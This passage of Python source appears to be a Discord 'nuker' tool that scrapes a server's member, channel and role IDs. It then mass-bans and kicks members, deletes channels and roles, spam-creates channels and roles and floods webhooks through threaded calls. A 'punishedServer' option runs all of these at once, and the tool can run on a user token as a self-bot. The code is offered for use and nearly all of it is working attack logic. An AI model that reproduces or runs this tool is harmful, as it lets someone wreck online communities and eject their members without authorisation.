            print(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Scrapped {Fore.LIGHTCYAN_EX} {Fore.GREEN}{channelcount} Channels")
            c.close()

        rolecount = 0
        with open('Scraped/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Scrapped {Fore.LIGHTCYAN_EX} {Fore.GREEN}{rolecount} Roles")
            r.close()

    async def NukeExecute(self):
        guild = input(f'{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}')
        channel_name = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Channels Name: {Fore.GREEN}")
        channel_amount = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} How Many?: {Fore.GREEN}")
        role_name = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Roles Name: {Fore.GREEN}")
        role_amount = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} How Many?: {Fore.GREEN}")
        print()

        members = open('Scraped/members.txt')
        channels = open('Scraped/channels.txt')
        roles = open('Scraped/roles.txt')

        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        for i in range(int(channel_amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
        for i in range(int(role_amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
        members.close()
        channels.close()
        roles.close()

    async def BanExecute(self):
        guild = input(f'{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        members.close()

    async def KickExecute(self):
        guild = input(f'{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
        members.close()

    async def ChannelDeleteExecute(self):
        guild = input(f'{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}')
        print()
        channels = open('Scraped/channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        channels.close()

    async def RoleDeleteExecute(self):
        guild = input(f'{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}')
        print()
        roles = open('Scraped/roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        roles.close()

    async def ChannelSpamExecute(self):
        guild = input(f'{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}')
        name = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Role Name:: {Fore.GREEN}")
        amount = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} How Many?: {Fore.GREEN}")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()

    async def RoleSpamExecute(self):
        guild = input(f'{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}')
        name = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Role Name: {Fore.GREEN}")
        amount = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} How Many?: {Fore.GREEN}")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()

    def Credits(self):
        os.system(f'')
        print(f'''
''')


    async def Menu(self):
        os.system(f'cls & title logged in as {client.user}')
        print(f'''
                                             {Fore.LIGHTBLACK_EX}█████{colors.gray}╗ {Fore.LIGHTBLACK_EX}██████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ 
                                            {Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗╚════{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗
                                            {Fore.LIGHTBLACK_EX}{colors.gray}╚{Fore.LIGHTBLACK_EX}█████{colors.gray}╔╝{Fore.LIGHTBLACK_EX} █████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗ ╚═══{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{colors.gray}╚{Fore.LIGHTBLACK_EX}█████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝
                                             {colors.gray}╚════╝ ╚═════╝  ╚═════╝  ╚═════╝ 
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

                                     ╔═════════════════════╗      ╔═══════════════════╗
                                     ║   discord.gg/8300   ║      ║ discord.gg/skids  ║
                                    ╔═══════════════════════╗   ╔═══════════════════════╗
                                    ║1 :MassBan             ║   ║5 :MassRole            ║
                                    ║2 :MassKick            ║   ║6 :MassChannls         ║
                                    ║3 :RemoveRole          ║   ║7 :punishedServer      ║ 
                                    ║4 :RemoveChannls       ║   ║8 :Scrapped            ║
                                    ╚═══════════════════════╝   ║9 :MassWebhook         ║
                                                                ╚═══════════════════════╝
        ''')

        choice = input(f'{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Debug{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Number:{Fore.LIGHTBLACK_EX} {Fore.GREEN}')
        if choice == '1': #bans
            await self.BanExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '2': #Kicks
            await self.KickExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '3': #Role Delete
            await self.RoleDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '4': #Delete Channel
            await self.ChannelDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '5': #Role Create
            await self.RoleSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '6': #Channel Create
            await self.ChannelSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '7': #beamserver
            await self.NukeExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '8': #Role Create
            await self.Scrape()
            time.sleep(3)
            await self.Menu()
        elif choice == '213': #Role Create
            await self.ThemeChanger()
        elif choice == '123' or choice == 'c':
            self.Credits()
            input()
            await self.Menu()
        elif choice == '9':
            amount = int(input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} How Many?: {Fore.GREEN}"))
            guild_id = int(input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}"))
            message = str(input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Webhook Message: {Fore.GREEN}"))
            await self.SpamWebhook(guild_id, amount, message)
        elif choice == '432' or choice == 'x':
            os._exit(0)

    @client.event
    async def on_ready():
        await skid().Menu()

    def Startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            print(f'{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX}Token Was Invalid {Fore.GREEN}')
            input()
            os._exit(0)

if __name__ == "__main__":
    skid().Startup()